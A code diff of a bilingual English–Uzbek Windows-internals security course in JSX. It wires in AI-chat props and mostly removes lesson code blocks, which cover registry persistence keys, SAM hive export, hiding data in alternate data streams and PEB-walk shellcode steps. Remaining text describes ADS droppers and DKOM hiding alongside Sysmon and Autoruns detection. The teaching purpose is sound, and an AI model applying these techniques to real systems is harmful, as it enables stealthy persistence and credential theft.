@@ -52,7 +52,7 @@ const LESSONS = {
 };
 
 // ─────────────────────────────────────────────────────────────
-function LessonScreen({ setRoute, user, markLessonComplete, onOpenProfile, lessonNum = 1 }) {
+function LessonScreen({ setRoute, user, markLessonComplete, onOpenProfile, onOpenAIChat, aiChatOpen, lessonNum = 1 }) {
   const lang = useLang();
   const [progress, setProgress] = useLS(0);
   const [quizOpen, setQuizOpen] = useLS(false);
@@ -74,7 +74,7 @@ function LessonScreen({ setRoute, user, markLessonComplete, onOpenProfile, lesso
 
   return (
     <div>
-      <TopNav route={{ name: "lesson" }} setRoute={setRoute} user={user} onOpenProfile={onOpenProfile}
+      <TopNav route={{ name: "lesson" }} setRoute={setRoute} user={user} onOpenProfile={onOpenProfile} onOpenAIChat={onOpenAIChat} aiChatOpen={aiChatOpen}
         crumb={[
           { label: lang === "en" ? "Courses" : "Kurslar", onClick: () => setRoute({ name: "dashboard" }) },
           { label: lang === "en" ? `Sec ${sectionLabel}` : `${sectionLabel}-bo'lim`, onClick: () => setRoute({ name: "section", section: sectionNum }) },
@@ -2977,27 +2977,6 @@ function SectionTPM() {
       </Callout>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.6 — Practical Commands</h3>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# Check TPM status in PowerShell (run as Administrator)
-Get-Tpm
-
-# Output shows:
-# TpmPresent     : True
-# TpmReady       : True
-# TpmEnabled     : True
-# TpmActivated   : True
-# ManagedAuthLevel: Full
-
-# Get TPM spec version
-Get-Tpm | Select-Object -ExpandProperty ManufacturerVersion
-
-# Check TPM in Device Manager → Security Devices → Trusted Platform Module 2.0
-
-# tpm.msc — MMC snap-in: shows manufacturer, version, PCR status
-# Start → Run → tpm.msc
-
-# Check BitLocker PCR binding
-manage-bde -protectors -get C:
-# Look for "TPM And PIN" or "TPM" under Key Protectors`}</code></pre>
     </section>
   ) : (
     <section>
@@ -3084,23 +3063,6 @@ manage-bde -protectors -get C:
       </Callout>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.6 — Amaliy Buyruqlar</h3>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# PowerShell'da TPM holatini tekshirish (Administrator sifatida)
-Get-Tpm
-
-# Natijada:
-# TpmPresent     : True
-# TpmReady       : True
-# TpmEnabled     : True
-# TpmActivated   : True
-
-# TPM spec versiyasini olish
-Get-Tpm | Select-Object -ExpandProperty ManufacturerVersion
-
-# tpm.msc — MMC snap-in: ishlab chiqaruvchi, versiya, PCR holatini ko'rsatadi
-# Boshlash → Ishga tushirish → tpm.msc
-
-# BitLocker PCR bog'liqligini tekshirish
-manage-bde -protectors -get C:`}</code></pre>
     </section>
   );
 }
@@ -3190,29 +3152,6 @@ function SectionRegistry() {
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.5 — Persistence Locations (Attacker's Registry)</h3>
       <P>Malware almost universally uses the registry for persistence. The most commonly abused keys — checked automatically by Windows on every login or service start:</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# Auto-run at every user login (low-priv — HKCU)
-HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
-HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce
-
-# Auto-run at every login (needs admin — HKLM)
-HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
-HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce
-
-# Service definitions (needs admin)
-HKLM\\SYSTEM\\CurrentControlSet\\Services\\<ServiceName>
-  → ImagePath = path to executable or driver
-  → Start     = 0x00 (Boot) | 0x01 (System) | 0x02 (Auto) | 0x03 (Manual)
-
-# DLL injection into EVERY process — highly dangerous
-HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs
-  → LoadAppInit_DLLs = 1 to enable (disabled by default on Windows 8+)
-
-# Winlogon notification packages (rare but used by bootkits)
-HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify
-
-# COM object hijacking (no admin needed for HKCU)
-HKCU\\Software\\Classes\\CLSID\\{<GUID>}\\InprocServer32
-  → Override a system COM object with your own DLL`}</code></pre>
       <Callout color="var(--c-err)" icon="warning" titleEn="AppInit_DLLs — the nuclear persistence option" titleUz="">
         Any DLL listed under AppInit_DLLs is injected into every process that loads user32.dll — which is almost every GUI application. Malware like Carberp, Zeus, and Flame abused this. Windows 8+ requires the DLL to be signed when Secure Boot is active, but many legacy systems still have this vector open.
       </Callout>
@@ -3221,22 +3160,6 @@ HKCU\\Software\\Classes\\CLSID\\{<GUID>}\\InprocServer32
       <P><strong>Sysmon Event ID 13 (RegistryValueSet):</strong> Logs registry value write operations. Configure Sysmon to monitor the Run/RunOnce keys, Services ImagePath, AppInit_DLLs — any write to these is immediately suspicious. Pair with Event ID 12 (key creation) and 14 (key rename — a trick to evade simple value monitors).</P>
       <P><strong>Process Monitor (Sysinternals):</strong> Real-time registry monitoring with full stack traces. Filter by path (e.g., "Path contains Run") and see exactly which process, which thread, and what stack called the write. Essential for malware analysis and incident response.</P>
       <P><strong>Autoruns (Sysinternals):</strong> The definitive tool for finding persistence. Scans 100+ autostart locations in the registry (and filesystem), shows the signed/unsigned status of each binary, highlights entries with VirusTotal hits. Run as Administrator and check "Hide Microsoft entries" to focus on third-party items.</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# Export registry hive offline (needs admin)
-reg export HKLM\\SOFTWARE C:\\backup\\software.reg
-
-# Save binary hive (for offline analysis with tools like regedit /L)
-reg save HKLM\\SAM C:\\backup\\sam.bak
-
-# Query a specific value
-reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
-
-# PowerShell: find all Run key entries across all users
-Get-Item "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-Get-Item "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-
-# Check if AppInit_DLLs is enabled
-Get-ItemProperty "HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows" |
-  Select-Object AppInit_DLLs, LoadAppInit_DLLs`}</code></pre>
     </section>
   ) : (
     <section>
@@ -3315,26 +3238,6 @@ Get-ItemProperty "HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Window
       <P>"CurrentControlSet" aslida ControlSet001 yoki ControlSet002 ga simvolik havola. Windows har muvaffaqiyatli yuklashda ular o'rtasida almashadi — yomon drayver qo'shilgan bo'lsa, oxirgi Yaxshi Ma'lum Konfiguratsiyaga (ControlSet002) yuklanish mumkin.</P>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.5 — Persistenslik Joylari (Tajovuzkorning Registry'si)</h3>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# Har bir foydalanuvchi loginida avtomatik ishga tushish (past-imtiyoz — HKCU)
-HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
-HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce
-
-# Har bir loginда avtomatik ishga tushish (admin kerak — HKLM)
-HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
-HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce
-
-# Servis ta'riflari (admin kerak)
-HKLM\\SYSTEM\\CurrentControlSet\\Services\\<ServisNomi>
-  → ImagePath = bajariladigan fayl yoki drayvер yo'li
-  → Start     = 0x00 (Boot) | 0x01 (System) | 0x02 (Auto) | 0x03 (Manual)
-
-# HAR BIR jarayonga DLL in'ektsiya — juda xavfli
-HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs
-  → LoadAppInit_DLLs = 1 yoqish uchun (Windows 8+ da standart o'chirilgan)
-
-# COM ob'ektni o'g'irlash (HKCU uchun admin kerak emas)
-HKCU\\Software\\Classes\\CLSID\\{<GUID>}\\InprocServer32
-  → Tizim COM ob'ektini o'z DLL ingiz bilan almashiring`}</code></pre>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.6 — Registry'ni Monitoring Qilish</h3>
       <P><strong>Sysmon Event ID 13 (RegistryValueSet):</strong> Registry qiymat yozish amallarini jurnaliga oladi. Sysmon'ni Run/RunOnce kalitlari, Services ImagePath, AppInit_DLLs ni kuzatish uchun sozlang — bularga har qanday yozish darhol shubhali. Event ID 12 (kalit yaratish) va 14 (kalit nomini o'zgartirish) bilan juftlang.</P>
@@ -3510,25 +3413,6 @@ function SectionNTFS() {
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.3 — Alternate Data Streams (ADS)</h3>
       <P>An <Term>Alternate Data Stream</Term> is a named $DATA attribute. The default stream has no name (the "main" file data). NTFS allows any number of additional named streams on any file or directory. Syntax: <code style={{fontFamily:"var(--font-mono)",fontSize:12,background:"rgba(255,255,255,0.06)",padding:"1px 6px",borderRadius:4}}>filename.txt:streamname:$DATA</code>. The alternate stream's size does NOT appear in <code>dir</code> output, Explorer, or most backup tools — only the main stream size is shown.</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# Create a hidden ADS
-echo "malicious payload" > innocent.txt:hidden_data
-
-# Read it back
-more < innocent.txt:hidden_data
-
-# List ADS streams (built-in, Windows 7+)
-dir /r innocent.txt
-# Shows:
-#    123 innocent.txt
-#     25 innocent.txt:hidden_data:$DATA
-
-# PowerShell
-Get-Item -Stream * C:\\path\\innocent.txt
-
-# Zone.Identifier — legitimate ADS Windows uses for downloaded files
-# Every file downloaded from the internet gets:
-# file.exe:Zone.Identifier:$DATA  →  [ZoneTransfer]\nZoneId=3
-# SmartScreen reads this to know the file came from the internet`}</code></pre>
       <Callout color="var(--c-err)" icon="warning" titleEn="ADS abuse by malware" titleUz="">
         Malware families including Poweliks, Ursnif, and APT tools have used ADS to hide payloads inside legitimate system files. A dropper can write a PowerShell payload into an ADS then create a scheduled task that reads and executes it: <code>wscript.exe "C:\Windows\explorer.exe:payload.vbs"</code>.
       </Callout>
@@ -3568,14 +3452,6 @@ Get-Item -Stream * C:\\path\\innocent.txt
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.5 — Journaling: $LogFile and $UsnJrnl</h3>
       <P><strong>$LogFile</strong> is NTFS's <Term>write-ahead journal</Term>. Before any metadata change, NTFS writes the intended change to $LogFile first. If the system crashes mid-operation, on next boot NTFS replays or rolls back incomplete transactions. Typically 64MB, circular, on every NTFS volume.</P>
       <P><strong>$UsnJrnl</strong> (Change Journal) records every change to every file/directory: creation, deletion, rename, modification, security change. From a forensics perspective, $UsnJrnl is a goldmine — it shows the history of all file changes, even after files are deleted, until the circular journal wraps around.</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# Check $UsnJrnl status
-fsutil usn queryjournal C:
-
-# Read recent USN journal entries (forensics)
-fsutil usn readjournal C: csv | findstr /i "delete"
-
-# $LogFile details
-fsutil logfile query C:`}</code></pre>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.6 — Hard Links, Junctions, and Symbolic Links</h3>
       <div style={{overflowX:"auto",marginTop:12}}>
@@ -3632,17 +3508,6 @@ fsutil logfile query C:`}</code></pre>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.2 — Muqobil Ma'lumot Oqimlari (ADS)</h3>
       <P>Nomlangan $DATA atributi. Sintaksis: <code style={{fontFamily:"var(--font-mono)",fontSize:12,background:"rgba(255,255,255,0.06)",padding:"1px 6px",borderRadius:4}}>fayl.txt:oqim_nomi:$DATA</code>. Muqobil oqimning hajmi <code>dir</code>, Explorer yoki aksariyat zaxira vositalarida ko'rinmaydi.</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# Yashirin ADS yaratish
-echo "yashirin ma'lumot" > oddiy.txt:yashirin
-
-# Ro'yxatga olish
-dir /r oddiy.txt
-
-# PowerShell
-Get-Item -Stream * C:\\yo'l\\oddiy.txt
-
-# Zone.Identifier — internetdan yuklab olingan fayllar uchun
-# fayl.exe:Zone.Identifier:$DATA → [ZoneTransfer]\nZoneId=3`}</code></pre>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.3 — NTFS Ruxsatlari vs Ulashish Ruxsatlari</h3>
       <P><strong>NTFS Ruxsatlari:</strong> ntfs.sys tomonidan ta'minlanadi. DACL va ACElardan iborat Xavfsizlik Tavsiflovchisi sifatida saqlanadi. Mahalliy yoki tarmoq kirishida amal qiladi.</P>
@@ -3762,21 +3627,6 @@ function SectionFAT32() {
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.6 — FAT32 Data Recovery</h3>
       <P>FAT32 is easier to recover data from than NTFS. When you delete a file, FAT32 only marks the first character of the directory entry with 0xE5 (deleted marker) and frees the FAT chain. The actual file data on disk is untouched until overwritten. Recovery tools (TestDisk, Recuva, PhotoRec) scan for 0xE5-marked entries and rebuild the cluster chain. FAT32 has no journal, so deletion leaves fewer forensic traces than NTFS (where $UsnJrnl records deletion events).</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# Check FAT32 volume details
-fsutil fsinfo volumeinfo D:
-
-# Check for filesystem errors (read-only)
-chkdsk D:
-
-# Fix errors (requires unmount or restart)
-chkdsk D: /F
-
-# Convert FAT32 to NTFS (non-destructive, one-way)
-convert D: /FS:NTFS
-# Warning: cannot convert back to FAT32 without formatting
-
-# Check volume type via PowerShell
-Get-Volume -DriveLetter D | Select-Object FileSystem, Size, SizeRemaining`}</code></pre>
     </section>
   ) : (
     <section>
@@ -3870,20 +3720,6 @@ Get-Volume -DriveLetter D | Select-Object FileSystem, Size, SizeRemaining`}</cod
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.5 — FAT32 Ma'lumotlarni Tiklash</h3>
       <P>FAT32 dan ma'lumotlarni tiklash NTFS dan osonroq. Faylni o'chirganda, FAT32 faqat katalog yozuvining birinchi belgisini 0xE5 bilan belgilaydi va FAT zanjiriga ozod qiladi. Diskdagi haqiqiy ma'lumotlar ustiga yozilgunga qadar tegılmagan. Tiklash vositalari (TestDisk, Recuva) 0xE5 yozuvlarini topadi va zanjirni qayta tiklaydi. FAT32 da jurnal yo'q — bu NTFS dan ko'ra kamroq kriminalistik iz qoldiradi.</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# FAT32 hajm tafsilotlari
-fsutil fsinfo volumeinfo D:
-
-# Xatolarni tekshirish
-chkdsk D:
-
-# Xatolarni tuzatish
-chkdsk D: /F
-
-# FAT32 dan NTFS ga o'tkazish (bir tomonlama, yo'qotishsiz)
-convert D: /FS:NTFS
-
-# Hajm turini tekshirish
-Get-Volume -DriveLetter D | Select-Object FileSystem, Size, SizeRemaining`}</code></pre>
     </section>
   );
 }
@@ -3900,24 +3736,6 @@ function SectionProcesses() {
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.1 — EPROCESS: The Kernel Structure</h3>
       <P>Every process is represented in the kernel as an <Term>EPROCESS</Term> structure — a large, partially opaque block of memory allocated from the non-paged pool. It contains everything the kernel needs to manage the process. Key fields (x64 Windows 11):</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`// Simplified EPROCESS layout (selected fields, offsets vary by build)
-typedef struct _EPROCESS {
-  KPROCESS         Pcb;              // Dispatcher header + scheduler state
-  EX_PUSH_LOCK     ProcessLock;
-  LARGE_INTEGER    CreateTime;
-  LARGE_INTEGER    ExitTime;
-  RTL_AVL_TREE     VadRoot;          // Virtual Address Descriptor tree (VAD)
-                                     //   — describes every mapped region
-  HANDLE_TABLE*    ObjectTable;      // Handle table (files, mutexes, events, ...)
-  EX_FAST_REF      Token;            // Access token → who is this process?
-  ULONG_PTR        UniqueProcessId;  // PID
-  LIST_ENTRY       ActiveProcessLinks; // Doubly-linked list of all EPROCESS nodes
-  ULONG            ImagePathHash;
-  UNICODE_STRING   ImageFileName;    // Short name (up to 15 chars)
-  SECTION_OBJECT*  SectionObject;    // Mapped executable
-  ULONG            ProtectionLevel;  // PPL: Protected Process Light level
-  ULONG            Flags2;           // IsBeingDebugged, IsSubsystemProcess, ...
-} EPROCESS;`}</code></pre>
       <P>The <Em>ActiveProcessLinks</Em> doubly-linked list connects every live EPROCESS. Task Manager and Process Explorer walk this list to enumerate processes. DKOM (Direct Kernel Object Manipulation) rootkits unlink an EPROCESS from this list to hide a process from user-space tools — but forensic tools can scan the pool for EPROCESS signatures to find unlinked processes.</P>
       <Callout color="var(--c-warn)" icon="warning" titleEn="VAD tree — the real memory map" titleUz="">
         The <strong>Virtual Address Descriptor (VAD)</strong> tree is the authoritative map of a process's virtual address space. Every VirtualAlloc, MapViewOfFile, and LoadLibrary creates a VAD node. Malware analysis tools (VadInfo in WinDbg, malfind in Volatility) walk the VAD tree to find injected regions — memory that is executable, writable, and not backed by a file on disk is a strong indicator of shellcode injection.
@@ -4027,24 +3845,6 @@ typedef struct _EPROCESS {
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.8 — Process Parent-Child Relationships</h3>
       <P>Every EPROCESS stores its <Term>parent PID (PPID)</Term>. When Explorer launches notepad.exe, notepad's PPID is Explorer's PID. However, the parent-child relationship in Windows is <Em>not enforced</Em> after creation — a process can specify any PID as its parent via PROC_THREAD_ATTRIBUTE_PARENT_PROCESS attribute in CreateProcess. Malware uses PPID spoofing to make malicious processes appear as children of explorer.exe or svchost.exe rather than the actual launching process. Detecting PPID spoofing: compare the PPID in EPROCESS with the actual handle inheritance chain using WMI or ETW events.</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# List all processes with PID and PPID (PowerShell)
-Get-CimInstance Win32_Process | Select-Object ProcessId, ParentProcessId, Name, CommandLine |
-  Sort-Object ProcessId | Format-Table -AutoSize
-
-# Find anomalous parent-child relationships
-# Expected: svchost.exe PPID = services.exe
-# Suspicious: svchost.exe PPID = cmd.exe or powershell.exe
-
-# Sysmon Event ID 1 — Process Create
-# Logs: Image, CommandLine, ParentImage, ParentCommandLine, Hashes, IntegrityLevel
-# Essential for detecting PPID spoofing and living-off-the-land attacks
-
-# Check process token integrity level
-Get-Process -Name notepad | ForEach-Object {
-  $p = $_
-  $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
-  $token.Groups | Where-Object { $_.Value -like "S-1-16-*" }
-}`}</code></pre>
     </section>
   ) : (
     <section>
@@ -4053,18 +3853,6 @@ Get-Process -Name notepad | ForEach-Object {
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.1 — EPROCESS: Yadro Tuzilmasi</h3>
       <P>Har bir jarayon yadrada <Term>EPROCESS</Term> tuzilmasi sifatida ifodalanadi — paged bo'lmagan pooldan ajratilgan katta, qisman noaniq xotira bloki. U yadroning jarayonni boshqarishi uchun kerak bo'lgan hamma narsani o'z ichiga oladi.</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`// Soddalashtirilgan EPROCESS (tanlangan maydonlar)
-typedef struct _EPROCESS {
-  KPROCESS         Pcb;              // Dispatcher sarlavhasi + rejalashtiruvchi holati
-  LARGE_INTEGER    CreateTime;       // Yaratilish vaqti
-  RTL_AVL_TREE     VadRoot;          // Virtual Manzil Tavsiflovchi daraxti (VAD)
-  HANDLE_TABLE*    ObjectTable;      // Handle jadvali (fayllar, mutex, event, ...)
-  EX_FAST_REF      Token;            // Kirish tokeni → bu jarayon kim?
-  ULONG_PTR        UniqueProcessId;  // PID
-  LIST_ENTRY       ActiveProcessLinks; // Barcha EPROCESS larning ikki tomonlama ro'yxati
-  UNICODE_STRING   ImageFileName;    // Qisqa nom (15 belgigacha)
-  ULONG            ProtectionLevel;  // PPL: Himoyalangan Jarayon Yengil darajasi
-} EPROCESS;`}</code></pre>
       <P><Em>ActiveProcessLinks</Em> ikki tomonlama ro'yxati barcha tirik EPROCESS larni birlashtiradi. Task Manager va Process Explorer jarayonlarni sanash uchun bu ro'yxatni aylanib chiqadi. DKOM rootkit lar jarayonni user-space vositalaridan yashirish uchun EPROCESS ni bu ro'yxatdan olib tashlaydi — lekin kriminalistik vositalar ulangan bo'lmagan jarayonlarni topish uchun pool ni EPROCESS imzolari uchun skanerlashi mumkin.</P>
       <Callout color="var(--c-warn)" icon="warning" titleUz="VAD daraxti — haqiqiy xotira xaritasi" titleEn="">
         <strong>Virtual Manzil Tavsiflovchi (VAD)</strong> daraxti jarayonning virtual manzil fazosining vakolatli xaritasi. Har bir VirtualAlloc, MapViewOfFile va LoadLibrary VAD tugunini yaratadi. Zararli dastur tahlil vositalari (Volatility'da malfind) VAD daraxtini aylanib chiqib in'ektlangan hududlarni topadi — bajariladigan, yozish mumkin va diskdagi faylga asoslanmagan xotira shellcode in'ektsiyasining kuchli ko'rsatkichi.
@@ -4121,17 +3909,6 @@ typedef struct _EPROCESS {
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.6 — Jarayon Ota-Bola Munosabatlari va PPID Soxtalashtirish</h3>
       <P>Har bir EPROCESS o'zining <Term>ota-ona PID (PPID)</Term> ini saqlaydi. Lekin Windows'da ota-bola munosabati yaratilgandan keyin <Em>ta'minlanmaydi</Em> — jarayon CreateProcess da PROC_THREAD_ATTRIBUTE_PARENT_PROCESS atributi orqali istalgan PIDni ota-ona sifatida ko'rsatishi mumkin. Zararli dasturlar PPID soxtalashtirish orqali zararli jarayonlarni haqiqiy ishga tushiruvchi jarayon o'rniga explorer.exe yoki svchost.exe ning bolasi ko'rinishida ko'rsatadi.</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# PID va PPID bilan barcha jarayonlar ro'yxati (PowerShell)
-Get-CimInstance Win32_Process |
-  Select-Object ProcessId, ParentProcessId, Name, CommandLine |
-  Sort-Object ProcessId | Format-Table -AutoSize
-
-# Anomal ota-bola munosabatlarini topish
-# Kutilgan: svchost.exe PPID = services.exe
-# Shubhali: svchost.exe PPID = cmd.exe yoki powershell.exe
-
-# Sysmon Event ID 1 — Jarayon Yaratish
-# Yozadi: Image, CommandLine, ParentImage, Hashes, IntegrityLevel`}</code></pre>
     </section>
   );
 }
@@ -4148,19 +3925,6 @@ function SectionThreads() {
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.1 — ETHREAD and TEB</h3>
       <P>Every thread is represented in the kernel as an <Term>ETHREAD</Term> structure. Key fields:</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`typedef struct _ETHREAD {
-  KTHREAD        Tcb;             // Kernel thread control block
-                                  //   — scheduler state, priority, quantum, APC queues
-  LARGE_INTEGER  CreateTime;
-  LARGE_INTEGER  ExitTime;
-  ULONG          ThreadId;        // TID
-  PEPROCESS      ThreadsProcess;  // Back-pointer to owning EPROCESS
-  PVOID          StartAddress;    // Original start address (CreateThread parameter)
-  PVOID          Win32StartAddress; // User-mode start address (for debugging)
-  CLIENT_ID      Cid;             // { UniqueProcess, UniqueThread }
-  ULONG          SameThreadApcFlags;
-  // ... impersonation token, I/O pending flag, ...
-} ETHREAD;`}</code></pre>
       <P>The <Term>TEB (Thread Environment Block)</Term> lives in user-mode memory and is accessible to the thread itself via the <code style={{fontFamily:"var(--font-mono)",fontSize:12,background:"rgba(255,255,255,0.06)",padding:"1px 6px",borderRadius:4}}>GS</code> segment register on x64 (<code>FS</code> on x86). Key TEB fields:</P>
       <div style={{overflowX:"auto",marginTop:12}}>
         <table style={{width:"100%",borderCollapse:"collapse",fontSize:13}}>
@@ -4278,26 +4042,6 @@ function SectionThreads() {
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.7 — Thread Pool and Worker Threads</h3>
       <P>Creating a new thread for every small unit of work is expensive (stack allocation, kernel object creation, context switch overhead). Windows provides a built-in <Term>Thread Pool</Term> API (TP_*: CreateThreadpool, SubmitThreadpoolWork, CreateThreadpoolTimer, etc.) that manages a pool of worker threads reused across work items. The thread pool dynamically scales the thread count based on CPU utilization and work queue depth.</P>
       <P>The CLR (.NET runtime), the I/O Completion Port (IOCP) model, and the Win32 thread pool all use this mechanism. From a security perspective, thread pools make attribution harder — malicious work items can be submitted to the system thread pool (via <code>QueueUserWorkItem</code>) so that the executing thread belongs to a system-managed pool thread rather than a thread explicitly created by the malware.</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# List all threads in a process (PowerShell)
-Get-Process -Name "notepad" | Select-Object -ExpandProperty Threads |
-  Select-Object Id, StartAddress, ThreadState, WaitReason | Format-Table
-
-# WinDbg — list threads in live session
-!process 0 0 notepad.exe  # find EPROCESS
-.process /r /p <eprocess_addr>
-~*          # show all threads
-~0 kb       # stack of thread 0
-
-# Sysmon Event ID 8 — CreateRemoteThread
-# Configure in sysmonconfig.xml:
-# <RuleGroup name="" groupRelation="or">
-#   <CreateRemoteThread onmatch="include">
-#     <TargetImage condition="is">lsass.exe</TargetImage>
-#   </CreateRemoteThread>
-# </RuleGroup>
-
-# Process Hacker: right-click process → Properties → Threads tab
-# Shows all threads, start address, start module, CPU usage per thread`}</code></pre>
     </section>
   ) : (
     <section>
@@ -4306,21 +4050,6 @@ Get-Process -Name "notepad" | Select-Object -ExpandProperty Threads |
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.1 — ETHREAD va TEB</h3>
       <P>Har bir thread yadrada <Term>ETHREAD</Term> tuzilmasi sifatida ifodalanadi. <Term>TEB (Thread Muhit Bloki)</Term> user-mode xotirasida joylashgan va x64 da <code style={{fontFamily:"var(--font-mono)",fontSize:12,background:"rgba(255,255,255,0.06)",padding:"1px 6px",borderRadius:4}}>GS</code> segment registri orqali thread ning o'ziga kirish mumkin. Shellcode ko'pincha GS:[0x60] dan PEB topib, yuklangan DLL larni Windows API chaqiruvisiz topadi ("PEB yurishi") — bu antivirus tomonidan joylashtirilgan IAT hook larini ishga tushirmaslik uchun.</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`// TEB asosiy maydonlari (x64 offsetlar)
-GS:[0x00]  = NtTib.ExceptionList  // SEH zanjiri
-GS:[0x08]  = NtTib.StackBase      // Stek yuqori qismi
-GS:[0x10]  = NtTib.StackLimit     // Stek pastki qismi (majburiy)
-GS:[0x30]  = NtTib.Self           // TEB ga ko'rsatgich
-GS:[0x48]  = ClientId.UniqueThread // TID
-GS:[0x60]  = ProcessEnvironmentBlock // PEB ga ko'rsatgich
-GS:[0x68]  = LastErrorValue        // GetLastError() natijasi (thread bo'yicha)
-GS:[0x1480] = TlsSlots[0..63]     // Thread Mahalliy Saqlash slotlari
-
-// Shellcode klassik PEB yurishi:
-// mov rax, gs:[0x60]  // PEB
-// mov rax, [rax+0x18] // PEB.Ldr
-// mov rax, [rax+0x20] // InMemoryOrderModuleList
-// -- modullarni aylanib chiqib DLLlarni topadi --`}</code></pre>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.2 — Thread Holatlari</h3>
       <div style={{overflowX:"auto",marginTop:12}}>
@@ -4381,21 +4110,6 @@ GS:[0x1480] = TlsSlots[0..63]     // Thread Mahalliy Saqlash slotlari
       </Callout>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.6 — Amaliy Buyruqlar</h3>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# Jarayondagi barcha thread larni ro'yxatga olish (PowerShell)
-Get-Process -Name "notepad" | Select-Object -ExpandProperty Threads |
